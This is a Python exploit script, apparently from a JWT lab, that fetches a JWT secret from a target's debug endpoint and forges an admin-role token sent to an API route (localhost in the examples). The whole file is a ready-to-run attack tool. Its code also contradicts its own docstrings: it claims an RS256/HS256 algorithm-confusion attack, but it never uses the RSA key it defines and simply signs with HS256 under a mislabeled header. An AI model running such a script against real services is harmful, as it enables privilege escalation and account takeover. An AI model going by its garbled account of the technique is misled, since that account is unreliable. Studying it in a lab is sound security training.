#!/usr/bin/env python3
"""
JWT Lab - Algorithm Confusion Attack

This script demonstrates the JWT algorithm confusion attack
where a token signed with HS256 is modified to use RS256.
"""

import jwt
import json
import base64
import sys
import requests
import time
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import serialization

def create_key_pair():
    """Create a new RSA key pair for the attack."""
    private_key = rsa.generate_private_key(
        public_exponent=65537,
        key_size=2048
    )
    
    # Get the public key in PEM format
    public_key = private_key.public_key().public_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PublicFormat.SubjectPublicKeyInfo
    )
    
    # Get the private key in PEM format
    pem_private = private_key.private_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PrivateFormat.PKCS8,
        encryption_algorithm=serialization.NoEncryption()
    )
    
    return pem_private, public_key

def decode_token(token):
    """Decode a JWT token without verifying the signature."""
    try:
        # Split the token into its parts
        parts = token.split('.')
        if len(parts) != 3:
            print("[-] Invalid token format")
            return None, None
        
        # Decode the header
        header_bytes = base64.urlsafe_b64decode(parts[0] + "=" * ((4 - len(parts[0]) % 4) % 4))
        header = json.loads(header_bytes.decode('utf-8'))
        
        # Decode the payload
        payload_bytes = base64.urlsafe_b64decode(parts[1] + "=" * ((4 - len(parts[1]) % 4) % 4))
        payload = json.loads(payload_bytes.decode('utf-8'))
        
        return header, payload
    
    except Exception as e:
        print(f"[-] Error decoding token: {e}")
        return None, None

def exploit_alg_confusion(url, secret, payload=None, send_request=True):
    """
    Perform the algorithm confusion attack.
    
    1. Create a new key pair
    2. Sign a token with the private key using RS256
    3. The server will try to verify it using HS256 with the public key as the secret
    """
    # Create default payload if none provided
    if not payload:
        payload = {
            "userId": "1234567890",
            "username": "user",
            "role": "admin",
            "iat": int(time.time()),
            "exp": int(time.time()) + 3600
        }
    
    try:
        # Create token using the symmetric secret as if it were an asymmetric key
        confused_token = jwt.encode(
            payload,
            secret,  # Using the secret as the key
            algorithm="HS256",  # Actually using HS256
            headers={"alg": "RS256"}  # But claiming it's RS256
        )
        
        print(f"[+] Generated algorithm confusion token: {confused_token}")
        
        if send_request:
            # Send request to the vulnerable endpoint
            headers = {"Authorization": f"Bearer {confused_token}"}
            response = requests.get(url, headers=headers)
            
            print(f"[+] Response status code: {response.status_code}")
            print(f"[+] Response body: {response.text}")
            
            if response.status_code == 200:
                print("[+] Exploit successful! The server accepted the algorithm confused token.")
            else:
                print("[-] Exploit failed. The server rejected the token.")
        
        return confused_token
    
    except Exception as e:
        print(f"[-] Error during exploit: {e}")
        return None

def fetch_secret_from_debug(debug_url):
    """Fetch the JWT secret from the debug endpoint."""
    try:
        response = requests.get(debug_url)
        if response.status_code == 200:
            data = response.json()
            # Try to extract the secret based on our knowledge of the server structure
            if 'config' in data and 'jwtSecret' in data['config']:
                return data['config']['jwtSecret']
            
            # Output the entire response for manual inspection
            print(f"[*] Debug endpoint response: {json.dumps(data, indent=2)}")
            
            # Ask user to input the secret if it wasn't found automatically
            secret = input("[?] Could not automatically extract JWT secret. Please enter it manually: ")
            return secret
        else:
            print(f"[-] Failed to access debug endpoint: {response.status_code}")
            return None
    except Exception as e:
        print(f"[-] Error fetching secret: {e}")
        return None

def print_usage():
    print("Usage:")
    print("  1. Generate a confused algorithm token:")
    print("     python alg_confusion.py generate <secret_key>")
    print()
    print("  2. Full exploit with secret extraction:")
    print("     python alg_confusion.py exploit <base_url>")
    print()
    print("  3. Direct exploit with known secret:")
    print("     python alg_confusion.py direct <target_url> <secret_key>")
    print()
    print("Examples:")
    print("  python alg_confusion.py generate supersecretkey")
    print("  python alg_confusion.py exploit http://localhost:3000")
    print("  python alg_confusion.py direct http://localhost:3000/api/alg-confusion supersecretkey")

def main():
    if len(sys.argv) < 2 or sys.argv[1] in ["-h", "--help"]:
        print_usage()
        sys.exit(1)
    
    action = sys.argv[1]
    
    if action == "generate":
        if len(sys.argv) < 3:
            print("[-] Please provide a secret key.")
            print("    Example: python alg_confusion.py generate supersecretkey")
            sys.exit(1)
        
        secret = sys.argv[2]
        exploit_alg_confusion(None, secret, send_request=False)
    
    elif action == "exploit":
        if len(sys.argv) < 3:
            print("[-] Please provide the base URL of the API.")
            print("    Example: python alg_confusion.py exploit http://localhost:3000")
            sys.exit(1)
        
        base_url = sys.argv[2]
        debug_url = f"{base_url}/api/debug"
        target_url = f"{base_url}/api/alg-confusion"
        
        print(f"[*] Fetching JWT secret from debug endpoint: {debug_url}")
        secret = fetch_secret_from_debug(debug_url)
        
        if secret:
            print(f"[+] Found secret: {secret}")
            print(f"[*] Exploiting algorithm confusion vulnerability at: {target_url}")
            exploit_alg_confusion(target_url, secret)
        else:
            print("[-] Could not retrieve JWT secret. Exploit aborted.")
    
    elif action == "direct":
        if len(sys.argv) < 4:
            print("[-] Please provide target URL and secret key.")
            print("    Example: python alg_confusion.py direct http://localhost:3000/api/alg-confusion supersecretkey")
            sys.exit(1)
        
        target_url = sys.argv[2]
        secret = sys.argv[3]
        
        print(f"[*] Exploiting algorithm confusion vulnerability at: {target_url}")
        exploit_alg_confusion(target_url, secret)
    
    else:
        print(f"[-] Unknown action: {action}")
        print_usage()
        sys.exit(1)

if __name__ == "__main__":
    main() 